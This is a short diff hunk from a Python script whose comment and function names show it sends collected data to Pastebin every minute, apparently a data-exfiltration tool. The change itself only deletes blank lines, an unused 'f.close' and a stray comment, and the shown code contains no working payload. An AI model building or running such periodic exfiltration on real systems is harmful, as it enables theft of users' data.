@@ -71,18 +71,8 @@ def fill_buffer_upload(myInode, uploadInterval):
             else:
                 raise SystemExit('[!] - Failed to create paste! ({0})'.format(api_user_key.split(', ')[1]))
                 
-            
-        
-        
-    f.close
-    # Create a Paste\
-    
-        
-    
+   
 #Exfiltrade data to Pastebin every min
-
-
-
 
 def main():
     time_to_upload = None
